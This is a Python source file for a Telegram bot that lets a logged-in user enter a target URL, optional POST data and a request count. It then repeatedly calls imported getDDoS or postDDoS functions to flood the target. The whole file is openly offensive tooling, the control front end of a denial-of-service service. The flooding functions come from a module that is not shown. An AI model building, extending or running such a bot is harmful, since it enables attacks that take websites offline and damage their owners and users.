import telebot
import config
from dbworker import set_state, get_current_state
from POSTGET import postDDoS, getDDoS

client = telebot.TeleBot(config.config["token"])

link = []
data = []

def secondDDoS(message):
    if(message.text == "Exit"):
        set_state(message.chat.id, config.States.S_LOGINED_B)
    elif(message.text == "GET"):
        set_state(message.chat.id, config.States.S_DDOS_GET1_B)
    elif (message.text == "POST"):
        set_state(message.chat.id, config.States.S_DDOS_POST1_B)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET1_B)
def sGETDDOS1(message):
    if(message.text != "Exit"):
        link.append(message.text)
        set_state(message.chat.id, config.States.S_DDOS_GET2_B)
    else:
        set_state(message.chat.id, config.States.S_DDOS_B)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET2_B)
def sGETDDOS2(message):
    if(message.text != "Exit"):
        operations = int(message.text)
        for i in range(operations):
            getDDoS(link[0])
        set_state(message.chat.id, config.States.S_LOGINED_B)
    else:
        set_state(message.chat.id, config.States.S_DDOS_B)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST1_B)
def sPOSTDDOS1(message):
    if(message.text != "Exit"):
        link.append(message.text)
        set_state(message.chat.id, config.States.S_DDOS_POST2_B)
    else:
        set_state(message.chat.id, config.States.S_DDOS_B)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST2_B)
def sPOSTDDOS2(message):
    if(message.text != "Exit"):
        data.append(message.text)
        set_state(message.chat.id, config.States.S_DDOS_POST3_B)
    else:
        set_state(message.chat.id, config.States.S_DDOS_B)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST3_B)
def sPOSTDDOS3(message):
    if(message.text != "Exit"):
        operations = int(message.text)
        for i in range(operations):
            postDDoS(link[0], data[0])
        set_state(message.chat.id, config.States.S_LOGINED_B)
    else:
        set_state(message.chat.id, config.States.S_DDOS_B)